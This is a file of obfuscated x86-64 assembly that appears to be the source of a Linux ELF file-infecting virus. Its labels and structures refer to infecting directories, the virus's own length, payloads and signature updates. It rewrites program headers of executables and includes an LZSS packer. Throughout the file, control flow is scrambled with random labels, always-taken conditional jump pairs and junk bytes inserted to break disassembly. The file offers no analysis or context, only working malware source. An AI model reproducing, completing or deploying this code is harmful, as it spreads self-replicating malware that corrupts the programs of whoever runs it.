..@on0FKbBGuL5Z:
    jnz         ..@6iHaSqzKkkPE
    jmp         $+3
db 0x0e
    jmp         $+4
db 0x53, 0xe0
    jmp         ..@G4qcRNb4gMHk
..@lwMXdA0hp9F9:
    xor         rdx, rdx
    js          ..@lXKoBI0jGRVx
    jns         ..@lXKoBI0jGRVx
..@QghO61EqL9cB:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         ..@6oFBFbm5iZQH
..@p37old7mfoaj:
    sub         r4, m6
    jmp         ..@qhKKPmCa51RR
..@MMNkTspjPy41:
    jne         ..@FLCq9KmgNSsB
    cmp         BYTE [r1+16], ET_EXEC
    jmp         $+3
db 0xf7
    jl          ..@8Ab4behoWTyP
    jge         ..@8Ab4behoWTyP
..@spOGFvUt5fd3:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    jb          ..@0n6ENAODxlSD
    jae         ..@0n6ENAODxlSD
..@fiObNyuIObLA:
    mov         r3, [r1+e_h.e_phoff]
    lea         r4, [r1]
    add         r4, r3
    jmp         $+5
db 0xc8, 0x90, 0x89
    js          ..@uLWScifCIJ4J
    jns         ..@uLWScifCIJ4J
..@6GxFbQQGqUyA:
    mov         BYTE [r1], 0x00
    jmp         $+3
db 0xdc
    jmp         ..@EKKc3SU51hI1
..@85t7Hrssn8AR:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         ..@CtcG4ensOHGo
..@EFJXOtiSfves:
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jmp         $+3
db 0xff
    jb          ..@UOxCvMUvgG9u
    jae         ..@UOxCvMUvgG9u
..@gUlQEPT1UqNB:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    je          ..@1pTBN4XL8vj0
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         $+3
db 0xfd
    jmp         ..@GR4PWfpDAadO
..@d4Eova5OMbXN:
    mov         eax, 0x00
    js          ..@iQftN2lmjBWW
    jns         ..@iQftN2lmjBWW
..@yoTdlj9hLBV1:
    rep         stosb
    jb          ..@s5r1kNfFqhEI
    jae         ..@s5r1kNfFqhEI
..@RmwQj83G1alH:
    push        r3
    jmp         $+3
db 0x3e
    jmp         $+3
db 0x69
    js          ..@h5kKeLFLspuS
    jns         ..@h5kKeLFLspuS
..@lXKoBI0jGRVx:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    js          ..@8JW2Wf1IaLnB
    jns         ..@8JW2Wf1IaLnB
..@5dFqxetLkZ7u:
    jnz         ..@lsrxRNxO1dmY
    jl          ..@bjzmvM4h4dFg
    jge         ..@bjzmvM4h4dFg
..@yPMZPERcrcUG:
    add         rsp, _INFDIR_OFF_size
    jl          ..@rn7kPe4N1PuQ
    jge         ..@rn7kPe4N1PuQ
..@V3sEezbuAyAb:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    js          ..@cFzLQnUX2T44
    jns         ..@cFzLQnUX2T44
..@qrOmCuZBqPd6:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jl          ..@QjZtc1YaXCYW
    jge         ..@QjZtc1YaXCYW
..@1Tye1sI1G11J:
    VAR         packed, procs
    jmp         $+5
db 0x4c, 0x45, 0x47
    jmp         ..@3302X8uI8jY1
..@BwHnreKiyFUD:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         $+3
db 0xd8
    js          ..@BDEk2VWBSnzH
    jns         ..@BDEk2VWBSnzH
..@Sya94H1xCtd9:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         ..@LMDl7KmZGNiK
..@3302X8uI8jY1:
    mov         r1, r5
    add         r1, r4
    cmp         BYTE [r1], 0x00
    jmp         $+3
db 0x67
    jl          ..@qTq4VrNYuLYS
    jge         ..@qTq4VrNYuLYS
..@NtXOQAZx1CZd:
    push        r1
    mov         r2, QWORD [r1+file.filename]
    OFILE       QWORD [r2], 0x02
    jmp         $+5
db 0x04, 0xee, 0xad
    js          ..@6sMhifIxZAia
    jns         ..@6sMhifIxZAia
..@nRtImfModyJv:
    ret
    jmp         $+4
db 0x4c, 0x39
    jmp         $+3
db 0x85
    jb          InfectDirectory
    jae         InfectDirectory
..@Hdj4TJLX1Eyl:
    push        r4
    jb          ..@awGIg6lC4D2W
    jae         ..@awGIg6lC4D2W
..@SWqGghrXh8js:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+5
db 0x18, 0x36, 0x32
    jl          ..@tuuixxHLb5Zy
    jge         ..@tuuixxHLb5Zy
..@Q38adMME29NV:
    mov         r2, original_virus_len+PADDING
    js          ..@G7ZvakXNwHiu
    jns         ..@G7ZvakXNwHiu
..@3gXhU5QImkdC:
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         $+4
db 0x2f, 0x3c
    jb          ..@UpkXpCzeawFY
    jae         ..@UpkXpCzeawFY
..@KlGqrzMXt6gm:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jmp         ..@BT7fUpyTVz04
..@ffL7a9gg9ukD:
%ifdef X86_64
    mov         rsi, QWORD [r8+file.filesize]
    mov         edx, 11b
%endif
    jmp         $+5
db 0x03, 0x85, 0x5c
    jmp         $+3
db 0xb6
    jmp         $+5
db 0x46, 0xe9, 0xbf
    jl          ..@DF2lhsewMw1E
    jge         ..@DF2lhsewMw1E
..@TYCrqD8y9aLB:
    je          ..@pKysl2wLF12v
    jmp         ..@HAiLpDez9q8i
..@x0UQY5pbnCeo:
    jmp         ..@2U7pgjbVf5pd
    jmp         $+5
db 0x92, 0x4b, 0xdb
    jmp         ..@owTMzOGEfuik
..@O4RJh4Yshov6:
    mov         ax, dx
    jmp         $+4
db 0x1a, 0xc1
    jmp         $+3
db 0x56
    js          ..@VnxmuW91zIFI
    jns         ..@VnxmuW91zIFI
..@lHA1dfwVsdfi:
    VAR         packed, dirs_tmp
    jmp         ..@OX1iWJ3FaBHB
..@T9Jjw6rKg5WH:
    xor         rax, rax
    jmp         $+5
db 0x55, 0xa1, 0x55
    jb          ..@usm1spK8ILz6
    jae         ..@usm1spK8ILz6
..@WnsLu5TfbnRm:
    or          bx, dx
    jmp         $+5
db 0x7b, 0xb2, 0x78
    js          ..@5RVJqyGzHlzo
    jns         ..@5RVJqyGzHlzo
..@HbL75KFJcaug:
    cmp         eax, 0x3
    jle         ..@ILFuuzyNwwVx
    jmp         $+5
db 0x17, 0x20, 0x8b
    jmp         $+3
db 0x58
    jmp         ..@2Ol2331izW8t
..@YwG9ihM9qb21:
    xor         rax, rax
    jl          ..@3FP61YZXVpfB
    jge         ..@3FP61YZXVpfB
..@yQFgUEq9ePlx:
    sub         al, 0x02
    jmp         $+4
db 0x3f, 0xd4
    js          ..@mE78TPGUdYIr
    jns         ..@mE78TPGUdYIr
..@3uVNz1ir4sHk:
    xor         rax, rax
    jmp         $+5
db 0x10, 0xaa, 0x8d
    je          ..@DcfaDhhGaAcZ
    jne         ..@DcfaDhhGaAcZ
..@4BKr9WgzzW1S:
    call_vsp    Strlen
    jmp         $+3
db 0xaa
    jmp         ..@NNyIiXiAxQl7
..@Kv12tsZ0hliT:
    mov         r2, r4
    jmp         ..@Bw88Vf6yt72I
..@Qz79efy2Pb28:
    xor         r4, r4
    jl          ..@3uVNz1ir4sHk
    jge         ..@3uVNz1ir4sHk
..@IlgxZhqGE2pH:
    jl          ..@vjEEbCmDhFFh
    cmp         BYTE [r1], 0x39
    jmp         ..@8MdioTqVJuxY
..@Gw3M2VJhuWlh:
    mov         eax, SYS_LSEEK
    syscall
    cmp         eax, 0x0
    je          ..@Ge1AIxLE6vKl
    jne         ..@Ge1AIxLE6vKl
..@e2DGFcKl8L3U:
    sub         rsp, _PAYLOAD_OFF_size
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         $+3
db 0xed
    jmp         ..@Z5dGYnofpNCy
..@bH15DR3j5wXW:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.index-_signature.start
    mov         DWORD [rdi], eax
    jb          ..@bBmaJM5Nnte9
    jae         ..@bBmaJM5Nnte9
..@D8irPPg1u7r2:
    mov         rsi, rdi
    add         rdi, rbx
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+3
db 0xac
    jl          ..@VvEpqiQ5nlEH
    jge         ..@VvEpqiQ5nlEH
..@6iHaSqzKkkPE:
    shr         edx, 1
    test        edx, edx
    jnz         ..@jVgWGHmGg8sU
    jmp         ..@cwFp3z8AfOk8
..@xLBrgvzHONZy:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jl          ..@cInF6ArauVeL
    jge         ..@cInF6ArauVeL
..@eY1K1M5PBGMx:
    cmp         rax, (-1)
    jmp         ..@BHeBF6UoTDla
..@CuK4tx2PNLIv:
    mov         r1, QWORD [r5+file.fileptr]
    add         r1, signature_len-1
    jmp         $+4
db 0xe5, 0x52
    jmp         ..@lctHSL9ymoFj
..@O9zsmz7vGk1Q:
    mov         rax, SYS_WAIT4
    jmp         ..@xwpcULTOrJZO
..@BT7fUpyTVz04:
    xor         rax, rax
    jmp         $+3
db 0x5b
    je          ..@wc2pgiar9hWd
    jne         ..@wc2pgiar9hWd
..@ioyWjQ5mcaae:
    sub         r2, 1
    jmp         ..@XYOxvfOeSK8B
..@eOq5pUp2PLq9:
    call        NonBinaryFile
    jmp         $+3
db 0xad
    jmp         $+4
db 0xea, 0x43
    jmp         ..@Mahqey4gWF2P
..@WQM4lYyCb6kF:
    syscall
    jmp         $+4
db 0x80, 0xdb
    jmp         ..@Q6RTDmwSsTNS
..@TRGNpw2karFK:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    jmp         $+4
db 0x51, 0x5e
    jl          ..@ivkBt6mNW3iJ
    jge         ..@ivkBt6mNW3iJ
..@EARyXOhFtNjA:
    test        eax, eax
    jnz         ..@W8IRcwkOikd0
    jmp         $+4
db 0xe3, 0xdc
    jmp         ..@cTQIcHlqeoPc
..@Jj82UGXYo1aK:
    call        LzssEncoder
    jmp         ..@bvXh0QBcplpk
..@5Zm5I8fLrIP2:
    push        r1
    mov         r5, QWORD [r1+file.fileptr]
    mov         r1, QWORD [r5+e_h.e_shoff]
    jmp         $+3
db 0xe8
    jmp         ..@xg086vKBic5j
..@LJRX9uDEVLn3:
    xor         r1, r1
    jmp         $+4
db 0x06, 0xf5
    jb          ..@p36lNEUiWvGf
    jae         ..@p36lNEUiWvGf
..@g5nPp5NufSKl:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         $+4
db 0x47, 0xeb
    jmp         ..@QrDxmwxg0xUL
..@qHxRH7xKk6zA:
    xor         rdx, rdx
    jb          ..@ePbeJMTCOGJ8
    jae         ..@ePbeJMTCOGJ8
..@0n6ENAODxlSD:
    mov         BYTE [r1], '/'
    jmp         ..@eu4jYhkSlYhi
..@BdI5QirtH7bP:
    shl         edi, 0x8
    jmp         $+5
db 0x27, 0x71, 0x59
    jmp         $+3
db 0xa9
    jmp         $+3
db 0x93
    jl          ..@O4RJh4Yshov6
    jge         ..@O4RJh4Yshov6
..@uLWScifCIJ4J:
    xor         r2, r2
    mov         r2w, WORD [r1+e_h.e_phnum]
    js          ..@vAHBVmtASHjp
    jns         ..@vAHBVmtASHjp
..@tZkZmvBKDdwL:
    add         r2, rax
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    mov         QWORD [r2+p_h.p_offset], r3
    jb          ..@aNoHtXbk9uHY
    jae         ..@aNoHtXbk9uHY
..@xg086vKBic5j:
    xor         r2, r2
    mov         r2w, WORD [r5+e_h.e_shnum]
    jmp         ..@4lVGqbyt8kzO
..@Ge1AIxLE6vKl:
    jle         ..@CBw5mMcFQ45P
    js          ..@XGdX1F3FC4ZE
    jns         ..@XGdX1F3FC4ZE
..@58ZAdBsY5v3m:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         $+3
db 0x00
    jmp         $+4
db 0xcf, 0x78
    js          ..@fdZp2SP6azED
    jns         ..@fdZp2SP6azED
..@DYH8r9hIF0lI:
    ret
    jmp         $+4
db 0xef, 0x4b
    js          UnmapFile
    jns         UnmapFile
..@mV1A4zx0WmbP:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    jmp         ..@vQ0VrkAdF9lJ
..@So894saMXbsk:
    jmp         ..@OX1iWJ3FaBHB
    jmp         ..@uQqs81K0AI4f

_eof: